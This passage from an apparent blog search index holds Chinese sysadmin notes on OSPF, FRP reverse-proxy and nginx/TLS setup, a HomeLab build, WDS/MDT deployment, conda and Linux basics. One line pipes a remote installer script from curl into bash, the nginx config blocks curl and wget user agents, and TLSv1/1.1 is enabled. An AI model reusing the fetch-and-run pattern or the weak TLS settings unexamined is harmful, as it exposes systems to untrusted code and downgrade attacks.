除了 ABR 下发的 Default Route，所有的 Type3 LSA 也禁止了.</li><li>NSSA: 禁止 Type4 和 Type5 的 LAS 进入, ASBR 改用 Type7 传递 External Network 的路由信息.</li><li>Not So Stubby Area (NSSA): 除了 ASBR 下发的 Default Route, 所有的 Type3 LSA 也禁止了.</li></ol><h1 id="八、Route"><a href="#八、Route" class="headerlink" title="八、Route"></a>八、Route</h1><ol><li>Metric</li><li>Cost</li><li>Route Type</li><li>路由选择</li><li>路由汇总</li></ol><h1 id="九、区域合并"><a href="#九、区域合并" class="headerlink" title="九、区域合并"></a>九、区域合并</h1><ol><li>Virtual Link</li><li>Tunnle</li></ol><h1 id="10-OSPF-优化"><a href="#10-OSPF-优化" class="headerlink" title="10. OSPF 优化"></a>10. OSPF 优化</h1><ol><li>Pacing Timer</li><li>SPF Throttle Timer</li><li>LSA Throttle Timer</li></ol><hr>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FRP</title>
      <link href="/2022/08/24/frp/"/>
      <url>/2022/08/24/frp/</url>
      
        <content type="html"><![CDATA[<h2 id="Centos7部署FRP"><a href="#Centos7部署FRP" class="headerlink" title="Centos7部署FRP"></a>Centos7部署FRP</h2><blockquote><ol><li>环境：一个域名、一台腾讯云的 centos7.6 服务器和一台内网 centos7.6 服务器</li><li>场景：实现可以域名通过公网的 IP 地址访问内网的访问</li></ol></blockquote><h3 id="Centos7最小化安装-优化"><a href="#Centos7最小化安装-优化" class="headerlink" title="Centos7最小化安装&amp;优化"></a>Centos7最小化安装&amp;优化</h3><pre><code class="hljs bash"><span class="hljs-comment"># 更换阿里源</span>curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo<span class="hljs-comment"># 清理yum缓存</span>yum clean all<span class="hljs-comment"># 重新生成缓存</span>yum makecache</code></pre><h3 id="Centos7安装FRP"><a href="#Centos7安装FRP" class="headerlink" title="Centos7安装FRP"></a>Centos7安装FRP</h3><pre><code class="hljs bash">yum -y install wgetwget https://github.com/fatedier/frp/releases/download/v0.64.0/frp_0.64.0_linux_amd64.tar.gztar -xvf frp_0.64.0_linux_amd64.tar.gz<span class="hljs-comment"># C:\frp_0.61.2\frpc.exe -c C:\frp_0.61.2\frpc.toml</span></code></pre><h3 id="Centos7配置FRPS"><a href="#Centos7配置FRPS" class="headerlink" title="Centos7配置FRPS"></a>Centos7配置FRPS</h3><pre><code class="hljs bash">bindAddr = <span class="hljs-string">&quot;0.0.0.0&quot;</span>bindPort = 47000auth.method = <span class="hljs-string">&quot;token&quot;</span>auth.token = <span class="hljs-string">&quot;XXX_TOKEN&quot;</span>webServer.addr = <span class="hljs-string">&quot;0.0.0.0&quot;</span>webServer.port = 47500webServer.user = <span class="hljs-string">&quot;XXX_USER&quot;</span>webServer.password = <span class="hljs-string">&quot;XXX_PASSWORD&quot;</span></code></pre><h3 id="Centos7配置一个FRPS服务器"><a href="#Centos7配置一个FRPS服务器" class="headerlink" title="Centos7配置一个FRPS服务器"></a>Centos7配置一个FRPS服务器</h3><pre><code class="hljs bash"><span class="hljs-comment"># vim /lib/systemd/system/frps.service</span>[Unit]Description=fraps ServiceAfter=network.target syslog.targetWants=network.target[Service]Type=simpleExecStart=/root/frp/frps -c /root/frp/frps.tomlRestart=on-failureStandardOutput=file:/root/frp/frps.logStandardError=file:/root/frp/frps.log[Install]WantedBy=multi-user.target<span class="hljs-comment"># 使用</span>systemctl daemon-reloadsystemctl <span class="hljs-built_in">enable</span> frps --nowsystemctl status frps</code></pre><h3 id="Centos7放通对应端口"><a href="#Centos7放通对应端口" class="headerlink" title="Centos7放通对应端口"></a>Centos7放通对应端口</h3><pre><code class="hljs bash">firewall-cmd --zone=public --add-port=47000/tcp --permanentfirewall-cmd --zone=public --add-port=47500/tcp --permanent</code></pre><h3 id="Centos7查看服务端口"><a href="#Centos7查看服务端口" class="headerlink" title="Centos7查看服务端口"></a>Centos7查看服务端口</h3><pre><code class="hljs bash">ps -aux|grep frp| grep -v grep</code></pre><h2 id="xxxxxxxxxx-bash"><a href="#xxxxxxxxxx-bash" class="headerlink" title="xxxxxxxxxx bash"></a>xxxxxxxxxx bash</h2><ol><li>域名申请</li></ol><pre><code class="hljs shell">本次使用的域名是 huangfamily.cnlanguage-shell复制代码</code></pre><ol><li>SSL 证书申请</li></ol><pre><code class="hljs shell">腾讯云[申请链接](https://console.cloud.tencent.com/ssl)language-shell复制代码</code></pre><ol><li>DNS 解析</li></ol><pre><code class="hljs shell">腾讯云[DNSPod](https://console.cloud.tencent.com/cns/detail/huangfamily.cn/records/0)language-shell复制代码</code></pre><h2 id="三、公网服务器"><a href="#三、公网服务器" class="headerlink" title="三、公网服务器"></a>三、公网服务器</h2><h3 id="3-1-frps-配置"><a href="#3-1-frps-配置" class="headerlink" title="3.1 frps 配置"></a>3.1 frps 配置</h3><ol><li>启动命令</li></ol><pre><code class="hljs shell">nohup ./frps -c frps.ini &amp;language-shell复制代码</code></pre><ol><li>frps.ini 配置文件</li></ol><pre><code class="hljs shell">[common]<span class="hljs-meta prompt_"># </span><span class="language-bash">frp监听的端口，用作服务端和客户端通信</span>bind_port = 4000token = XXX<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">服务端通过此端口接监听和接收公网用户的https请求</span>vhost_https_port = 4499<span class="hljs-meta prompt_"># </span><span class="language-bash">服务端通过此端口接监听和接收公网用户的http请求</span>vhost_http_port = 4498<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">frp提供了一个控制台，可以通过这个端口访问到控制台。可查看frp当前有多少代理连接以及对应的状态</span>dashboard_port = 4500dashboard_user = usernamedashboard_pwd = password<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">服务端的subdomain_host需要和客户端配置文件中的subdomain、local_port配合使用，</span><span class="hljs-meta prompt_"># </span><span class="language-bash">可通过&#123;subdomain&#125;.&#123;subdomain_host&#125; 的域名格式来访问自己本地的 web 服务。</span><span class="hljs-meta prompt_"># </span><span class="language-bash">假如服务端的subdomain_host为dev.msh.com，客户端某个配置组中的</span><span class="hljs-meta prompt_"># </span><span class="language-bash">subdomain为a,local_port为8585，</span><span class="hljs-meta prompt_"># </span><span class="language-bash">则：</span><span class="hljs-meta prompt_"># </span><span class="language-bash">访问 a.dev.msh.com ，等同于访问本地的localhost:8585</span>subdomain_host = huangfamily.cnlanguage-shell复制代码</code></pre><h3 id="3-2-nginx-配置"><a href="#3-2-nginx-配置" class="headerlink" title="3.2 nginx 配置"></a>3.2 nginx 配置</h3><ol><li>frp.conf</li></ol><pre><code class="hljs shell">server &#123;    listen 80;    server_name huangfamily.cn home.huangfamily.cn dev.huangfamily.cn staging.huangfamily.cn git.huangfamily.cn;    location / &#123;        # 7071端口即为frp监听的http端口        proxy_pass http://127.0.0.1:4498;        proxy_set_header Host $host:80;        proxy_set_header X-Real-IP $remote_addr;        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;        proxy_set_header Upgrade $http_upgrade;        proxy_set_header Connection &quot;upgrade&quot;;        proxy_connect_timeout 7d;        proxy_send_timeout 7d;        proxy_read_timeout 7d;        &#125;    # 防止爬虫抓取    if ($http_user_agent ~* &quot;360Spider|JikeSpider|Spider|spider|bot|Bot|2345Explorer|curl|wget|webZIP|qihoobot|Baiduspider|Googlebot|Googlebot-Mobile|Googlebot-Image|Mediapartners-Google|Adsbot-Google|Feedfetcher-Google|Yahoo! Slurp|Yahoo! Slurp China|YoudaoBot|Sosospider|Sogou spider|Sogou web spider|MSNBot|ia_archiver|Tomato Bot|NSPlayer|bingbot&quot;)        &#123;            return 403;        &#125;&#125;language-shell复制代码</code></pre><ol><li>ssl.conf</li></ol><pre><code class="hljs shell">server &#123;        #SSL 访问端口号为 443        listen 443 ssl;        #填写绑定证书的域名        server_name huangfamily.cn;        #证书文件名称        ssl_certificate huangfamily.cn_bundle.crt;        #私钥文件名称        ssl_certificate_key huangfamily.cn.key;        ssl_session_timeout 5m;        #请按照以下协议配置        ssl_protocols TLSv1 TLSv1.1 TLSv1.2;        #请按照以下套件配置，配置加密套件，写法遵循 openssl 标准。        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE;        ssl_prefer_server_ciphers on;        location / &#123;           #网站主页路径。此路径仅供参考，具体请您按照实际目录操作。           #例如，您的网站运行目录在/etc/www下，则填写/etc/www。           proxy_pass http://huangfamily.cn;        &#125;&#125;<span class="hljs-meta prompt_">#</span><span class="language-bash">server &#123;</span><span class="hljs-meta prompt_"># </span><span class="language-bash">   listen 80;</span><span class="hljs-meta prompt_"># </span><span class="language-bash">   <span class="hljs-comment">#填写绑定证书的域名</span></span><span class="hljs-meta prompt_"># </span><span class="language-bash">   server_name huangfamily.cn;</span><span class="hljs-meta prompt_"># </span><span class="language-bash">   <span class="hljs-comment">#把http的域名请求转成https</span></span><span class="hljs-meta prompt_"># </span><span class="language-bash">   <span class="hljs-built_in">return</span> 301 https://$host<span class="hljs-variable">$request_uri</span>;</span><span class="hljs-meta prompt_">#</span><span class="language-bash">&#125;</span>language-shell复制代码</code></pre><h2 id="四、frp-使用"><a href="#四、frp-使用" class="headerlink" title="四、frp 使用"></a>四、frp 使用</h2><ol><li>内网客户端配置</li></ol><pre><code class="hljs shell">[common]<span class="hljs-meta prompt_"># </span><span class="language-bash">部署frp服务端的公网服务器的ip</span>server_addr = 106.55.104.24<span class="hljs-meta prompt_"># </span><span class="language-bash">和服务端的bind_port保持一致</span>server_port = 4000token = XXX[huangfamily]type = httpslocal_port = 80custom_domains = huangfamily.complugin = https2httpplugin_local_addr = 127.0.0.1:80<span class="hljs-meta prompt_"></span><span class="hljs-meta prompt_"># </span><span class="language-bash">HTTPS 证书相关的配置</span>plugin_crt_path = ./huangfamily.cn_bundle.crtplugin_key_path = ./huangfamily.cn.keyplugin_host_header_rewrite = 127.0.0.1plugin_header_X-From-Where = frp[http]type = httplocal_port = 80custom_domains = huangfamily.cn[http-home]type = http<span class="hljs-meta prompt_"># </span><span class="language-bash">local_port代表你想要暴露给外网的本地web服务端口</span>local_port = 3000<span class="hljs-meta prompt_"># </span><span class="language-bash">subdomain 在全局范围内要确保唯一，每个代理服务的subdomain不能重名，否则会影响正常使用。</span><span class="hljs-meta prompt_"># </span><span class="language-bash">客户端的subdomain需和服务端的subdomain_host配合使用</span>subdomain = home[http-staging]type = httplocal_port = 3001subdomain = staging[http-dev]type = httplocal_port = 3002subdomain = dev[http-gitee]type = httplocal_port = 4001subdomain = gitlanguage-shell复制代码</code></pre><ol><li>配置开机自启动</li></ol><blockquote><p>vim &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;frps.service</p></blockquote><pre><code class="hljs shell">[Unit]Description=frps serviceAfter=network.target syslog.targetWants=network.target[Service]Type=simple<span class="hljs-meta prompt_">#</span><span class="language-bash">启动服务的命令（此处写你的frps的实际安装目录）</span>ExecStart=/root/frp38/frps -c /root/frp38/frps.ini[Install]WantedBy=multi-user.targetlanguage-shell复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>HomeLab</title>
      <link href="/2022/08/12/HomeLab/"/>
      <url>/2022/08/12/HomeLab/</url>
      
        <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><pre><code class="hljs bash"><span class="hljs-comment"># 修改主机名</span>hostnamectl set-hostname homelab_01<span class="hljs-comment"># Centos7 更换腾讯源</span>curl -o /etc/yum.repos.d/CentOS-Base.repo http://mirrors.cloud.tencent.com/repo/centos7_base.repoyum install -y net-tools vim wget gccyum -y install openssl openssl-devel patchsystemctl start sshd<span class="hljs-comment"># 安装1Panel. http://目标服务器 IP 地址:目标端口/安全入口</span>bash -c <span class="hljs-string">&quot;<span class="hljs-subst">$(curl -sSL https://resource.fit2cloud.com/1panel/package/v2/quick_start.sh)</span>&quot;</span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>WDS+MDT</title>
      <link href="/2022/07/28/WDS-MDT/"/>
      <url>/2022/07/28/WDS-MDT/</url>
      
        <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><blockquote><p>搭建一套自动化批量安装 Windows 电脑的服务</p></blockquote><h1 id="ESXI-安装与配置"><a href="#ESXI-安装与配置" class="headerlink" title="ESXI 安装与配置"></a>ESXI 安装与配置</h1><h2 id="硬件环境概述"><a href="#硬件环境概述" class="headerlink" title="硬件环境概述"></a>硬件环境概述</h2><blockquote><p>畅网 N305 多网口迷你小主机一台<br>32G DDR5 4800MHZ 内存条一根<br>长城 1TB M.2 PCIE 3.0 固态硬盘一根<br>网线 2 根, PEU 盘一个, 鼠标键盘一套</p></blockquote><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222224148.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222224320.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222224521.png" alt="img"></p><ol><li>按 Enter 继续安装</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222224705.png" alt="img"></p><ol><li>按 F11 接受许可</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222225551.png" alt="img"></p><ol><li>按 Enter 选择硬盘</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222225341.png" alt="img"></p><ol><li>按 Enter 重启</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222225745.png" alt="img"></p><ol><li>选择 OS</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222225912.png" alt="img"></p><ol><li>输入管理员密码</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222230033.png" alt="img"></p><ol><li>选择 F11 Install</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222230241.png" alt="img"></p><ol><li>重启</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222230445.png" alt="img"></p><ol><li>管理员登录</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222230753.png" alt="img"></p><ol><li>选择修改管理网络</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222230951.png" alt="img"></p><ol><li>打开网络设备</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222231317.png" alt="img"></p><ol><li>选择管理口</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222231628.png" alt="img"></p><ol><li>选择 IPv4</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222231733.png" alt="img"></p><ol><li>设置静态 IP</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20231222232011.png" alt="img"></p><ol><li>ESC 退出和保存配置，就可以使用浏览器通过 IP 地址访问 ESXI 了</li><li>网卡直通，过滤出可直通的设备，选择除管理网卡外的网络直通</li></ol><hr><h1 id="ROS-安装与配置"><a href="#ROS-安装与配置" class="headerlink" title="ROS 安装与配置"></a>ROS 安装与配置</h1><h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><ol><li>创建 Linux4.x 以上的系统</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/ROS-%E5%88%9B%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%9C%BA1.png" alt="img"></p><ol><li>自定义配置和锁定 1G 及以上内存</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/ROS-%E6%96%B0%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%9C%BA2.png" alt="img"></p><ol><li>添加 PCIE 设备</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/ROS-%E6%96%B0%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%9C%BA3.png" alt="img"></p><ol><li>配置虚拟机引导方式为 BIOS 启动，点击下一步，最后点击完成</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/ROS-%E6%96%B0%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%9C%BA4.png" alt="img"></p><ol><li>将 ROS 官网下载的 VDMK 硬盘上次，并添加到 ROS 虚拟机后，点击保存</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/ROS-%E6%96%B0%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%9C%BA5.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/ROS-%E6%96%B0%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%9C%BA5.2.png" alt="img"></p><ol><li>修改 VMDK 的打开和磁盘模式后，点击和打开虚拟机去配置即可。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/ROS-%E6%96%B0%E5%BB%BA%E8%99%9A%E6%8B%9F%E6%9C%BA6.png" alt="img"></p><h2 id="ROS-快速配置"><a href="#ROS-快速配置" class="headerlink" title="ROS 快速配置"></a>ROS 快速配置</h2><hr><h1 id="WDS-安装与配置"><a href="#WDS-安装与配置" class="headerlink" title="WDS 安装与配置"></a>WDS 安装与配置</h1><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">修改主机名</span><span class="hljs-meta prompt_"># </span><span class="language-bash">修改静态IP</span><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭防火墙</span><span class="hljs-meta prompt_"># </span><span class="language-bash">打开远程连接</span><span class="hljs-meta prompt_"># </span><span class="language-bash">安装WDS</span><span class="hljs-meta prompt_"># </span><span class="language-bash">配置WDS()</span>language-shell复制代码</code></pre><h1 id="MDT-安装与配置"><a href="#MDT-安装与配置" class="headerlink" title="MDT 安装与配置"></a>MDT 安装与配置</h1><h2 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h2><pre><code class="hljs shell">[Settings]Priority=DefaultProperties=MyCustomProperty[Default]OSInstall=YES_SMSTSOrgName=CICCHKSkipBDDWelcome=YESSkipCapture=YESSkipAdminPassword=YESAdminPassword=XXXSkipAppsOnUpgrade=YESSkipProductKey=YESSkipComputerBackup=YESSkipBitLocker=YESSkipComputerName=YESComputerName=CICCHKSkipDomainMembership=YESSkipTaskSequence=YESTaskSequenceID=TestSkipTimeZone=YESTimeZoneName=China Standard TimeSkipLocaleSelection=YESKeyboardLocale=en-USUserLocale=en-USUILanguage=en-USSkipLocalSelection=YESSkipUserData=YESSkipSummary=YESHideShell=YESFinishAction=LOGOFFlanguage-shell复制代码</code></pre><h2 id="Bootstrap"><a href="#Bootstrap" class="headerlink" title="Bootstrap"></a>Bootstrap</h2><pre><code class="hljs shell">[Default]DeployRoot=\\WDS\DeploymentShare$SkipBDDWelcome=YESUserDomain=workgroupUserID=administratorUserPassword=KeyboardLocale=en-USlanguage-shell复制代码</code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 运维 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Anaconda</title>
      <link href="/2022/06/21/Anaconda/"/>
      <url>/2022/06/21/Anaconda/</url>
      
        <content type="html"><![CDATA[<h1 id="创建Python环境"><a href="#创建Python环境" class="headerlink" title="创建Python环境"></a>创建Python环境</h1><pre><code class="hljs bash"><span class="hljs-comment"># 查看虚拟环境</span>conda <span class="hljs-built_in">env</span> list<span class="hljs-comment"># 创建虚拟机环境</span>conda create -n hcie python=3.8.3<span class="hljs-comment"># 激活虚拟环境</span>conda activate hcie<span class="hljs-comment"># 退出虚拟环境</span>conda deactivate<span class="hljs-comment"># 删除虚拟环境</span>conda remove -n hcie --all<span class="hljs-comment"># 查看配置文件路径</span>pip -v config list<span class="hljs-comment"># 添加代理 pip.ini</span>[global]proxy= http://127.0.0.1:7890</code></pre>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网络规划师</title>
      <link href="/2022/05/25/%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E5%B8%88/"/>
      <url>/2022/05/25/%E7%BD%91%E7%BB%9C%E8%A7%84%E5%88%92%E5%B8%88/</url>
      
        <content type="html"><![CDATA[<h1 id="学习"><a href="#学习" class="headerlink" title="学习"></a>学习</h1><h2 id="IPv6"><a href="#IPv6" class="headerlink" title="IPv6"></a>IPv6</h2><h3 id="IPv6地址表示方式"><a href="#IPv6地址表示方式" class="headerlink" title="IPv6地址表示方式"></a>IPv6地址表示方式</h3><pre><code class="hljs bash">1、地址压缩方式：中间0可用::压缩；前导0可以压缩；两者可以同时使用；::只能出现一次。2、地址表示方法：IPv6地址=前缀+接口标识，前缀相当于IPv4的网络ID，接口ID相当于IPv4地址中的主机ID。3、可聚合全球单播地址：2001::/64, 2002::/64用于IPv6网络中建立6to4隧道地址。（单播地址中，有效地址范围前缀内的IPv6地址的接口标识必须为64位）4、链路本地地址：FE80::/105、站点本地地址：FEC0::/106、用于表示不存在的地址：0:0:0:0:0:0:0:0或者::，相当于ipv4的0.0.0.0；未指定地址通常在目的地址还未确定时充当源地址使用。此地址不能分配给接口或者是做目标地址使用。7、环回接口地址：0:0:0:0:0:0:0:1或者::1，相当于IPv4的127.0.0.1</code></pre><h3 id="ICMPv6协议"><a href="#ICMPv6协议" class="headerlink" title="ICMPv6协议"></a>ICMPv6协议</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250807110816108.png" alt="ICMPv6协议"></p><p>ICMPv6协议</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250807111120429.png" alt="NDP协议"></p><p>NDP协议</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250807111402629.png" alt="报名&amp;功能"></p><p>报名&amp;功能</p><h3 id="IPv6地址配置方法"><a href="#IPv6地址配置方法" class="headerlink" title="IPv6地址配置方法"></a>IPv6地址配置方法</h3><pre><code class="hljs bash">1、手动配置：固定IPv6地址配置。2、无状态地址自动配置：基于ICMPv6 NDP的自动配置（SLAAC），客户端发送RS（路由器请求），服务端回应RA（路由器通告）中包括IPv6地址信息。3、有状态地址自动配置：基于DHCPv6的自动配置，需要配置DHCPv6服务。</code></pre><h3 id="IPv6报头结构"><a href="#IPv6报头结构" class="headerlink" title="IPv6报头结构"></a>IPv6报头结构</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250807133009311.png" alt="IPv6报头结构"></p><p>IPv6报头结构</p><h1 id="案例分析"><a href="#案例分析" class="headerlink" title="案例分析"></a>案例分析</h1><h1 id="论文"><a href="#论文" class="headerlink" title="论文"></a>论文</h1><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="IPv6-1"><a href="#IPv6-1" class="headerlink" title="IPv6"></a>IPv6</h2><p>1、[B] IPv6地址</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250811151805936.png" alt="img"></p><p>2、[B] IPv6报文</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250811151855986.png" alt="img"></p><p>3、[A] IPv6组播地址</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250811152033103.png" alt="img"></p><p>4、[A] IPv6单播地址</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250811152108795.png" alt="img"></p><p>5、[A] IPv6的缩写</p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250811152144558.png" alt="img"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 网络 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux</title>
      <link href="/2022/03/24/Linux/"/>
      <url>/2022/03/24/Linux/</url>
      
        <content type="html"><![CDATA[<h1 id="Linux基础"><a href="#Linux基础" class="headerlink" title="Linux基础"></a>Linux基础</h1><h2 id="Linux-概念"><a href="#Linux-概念" class="headerlink" title="Linux 概念"></a>Linux 概念</h2><h3 id="Linux-目录结构"><a href="#Linux-目录结构" class="headerlink" title="Linux 目录结构"></a>Linux 目录结构</h3><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250825171924754.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250825172226876.png" alt="Linux目录结构"></p><p>Linux目录结构</p><h3 id="Linux标准输入输出"><a href="#Linux标准输入输出" class="headerlink" title="Linux标准输入输出"></a>Linux标准输入输出</h3><pre><code class="hljs bash"><span class="hljs-comment"># 标准输出：0</span>终端<span class="hljs-comment"># 标准输入：1</span>键盘<span class="hljs-comment"># 标准错误：2</span>终端<span class="hljs-comment"># 输出重定向</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;hello word&quot;</span> &gt; aa.txt</code></pre><p><img src="https://cdn.jsdelivr.net/gh/hjxstart/PicGo@main/img/20250828151659700.png" alt="img"></p><h3 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h3><pre><code class="hljs bash"><span class="hljs-comment"># 一个文件或目录，有三种角色：文件的所有者u，文件所有者的所属组g，其他用户o，所有用户a</span><span class="hljs-comment">## Linux三种权限位</span><span class="hljs-built_in">read</span> <span class="hljs-comment"># 文件是cat; 目录是ls</span>write <span class="hljs-comment"># 文件是touch,vim; 目录是 mkdir,mv,rm</span>execute <span class="hljs-comment"># 文件是./脚本， 目录是cd 命令</span></code></pre><h3 id="文件特殊权限"><a href="#文件特殊权限" class="headerlink" title="文件特殊权限"></a>文件特殊权限</h3><pre><code class="hljs bash"><span class="hljs-comment">##文件特殊权限是对一般权限的补充（由于管理员不受一般权限的控制，可以通过特殊权限来控制），特殊权限会对管理员生效。</span><span class="hljs-comment"># SUID针对所有者的特殊权限：会让此文件执行者临时获取文件所有者的权限来完成某些工作，rwS</span><span class="hljs-comment"># SGID</span><span class="hljs-comment"># SBID其他用户的权限，</span>注：<span class="hljs-built_in">sudo</span> 是借用root权限SUID 是借用所有者的权限SGID 是借用属组的权限</code></pre><h2 id="Linux文件类型"><a href="#Linux文件类型" class="headerlink" title="Linux文件类型"></a>Linux文件类型</h2><pre><code class="hljs bash">以下文件类型均有对应字符表示：- : 平台文件d(directory) : 目录文件 c(character) : 字符设备文件b(block) : 块设备文件s(socket) : 套接字文件p(pipe) : 管道文件l(<span class="hljs-built_in">link</span>) : 符号链接文件<span class="hljs-comment"># 普通文件、目录文件、块设备文件、字符设备文件和套接字文件都是实际存在文件系统中的文件，而符号链接文件和命名管道</span><span class="hljs-comment"># 文件类型，权限，链接数，文件所有者，文件所属组，文件大小，最后修改时间，名称</span><span class="hljs-built_in">command</span> --<span class="hljs-built_in">help</span> <span class="hljs-comment"># 查看命令</span><span class="hljs-comment">## ls</span><span class="hljs-built_in">ls</span> -alh <span class="hljs-comment"># 大小使用k单位显示</span><span class="hljs-built_in">ls</span> -ai <span class="hljs-comment"># 显示index索引</span><span class="hljs-comment">## file [选项] 文件名</span>file anaconda-ks.cfg <span class="hljs-comment"># ASCII text 普通文本文件</span>file /bin/cd <span class="hljs-comment"># shell script 可运行脚本</span>file /var/log/wtmp <span class="hljs-comment"># data 数据格式的文件</span>file /var/log/tuned <span class="hljs-comment"># directory 目录文件</span>file /</code></pre><h3 id="普通文件类型（Regular-File）"><a href="#普通文件类型（Regular-File）" class="headerlink" title="普通文件类型（Regular File）"></a>普通文件类型（Regular File）</h3><pre><code class="hljs lasso"><span class="hljs-number">1</span>、纯文本文件（ASCII）: 普通文本，可以直接读取；<span class="hljs-number">2</span>、二进制文件（binary）：可运行脚本<span class="hljs-number">3</span>、数据格式的文件（<span class="hljs-built_in">data</span>）：cat /<span class="hljs-built_in">var</span>/<span class="hljs-keyword">log</span>/wtmp 读取不了，要使用 who /<span class="hljs-built_in">var</span>/<span class="hljs-keyword">log</span>/wtmp 读取复制代码</code></pre><h3 id="目录文件类型（Directory-File）"><a href="#目录文件类型（Directory-File）" class="headerlink" title="目录文件类型（Directory File）"></a>目录文件类型（Directory File）</h3><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> 命令可以进入的，蓝色复制代码</code></pre><h3 id="设备文件类型（Device-File）"><a href="#设备文件类型（Device-File）" class="headerlink" title="设备文件类型（Device File）"></a>设备文件类型（Device File）</h3><pre><code class="hljs gradle"><span class="hljs-number">1</span>、块设备文件（Block Device <span class="hljs-keyword">File</span>）：硬盘、USB；IDE（<span class="hljs-regexp">/dev/</span>hd**）,SCSI<span class="hljs-regexp">/SATA/U</span>SB（<span class="hljs-regexp">/dev/</span>sd**）<span class="hljs-number">2</span>、字符设备文件（Character Device <span class="hljs-keyword">File</span>）：键盘，鼠标，打印机复制代码</code></pre><h3 id="套接字文件（Socket）"><a href="#套接字文件（Socket）" class="headerlink" title="套接字文件（Socket）"></a>套接字文件（Socket）</h3><pre><code class="hljs">套接字文件是一种特殊的文件，用于进程间的通信，提供一种全双工的通信方式。网络通信方式，网络数据连接。复制代码</code></pre><h3 id="管道文件（FIFO）"><a href="#管道文件（FIFO）" 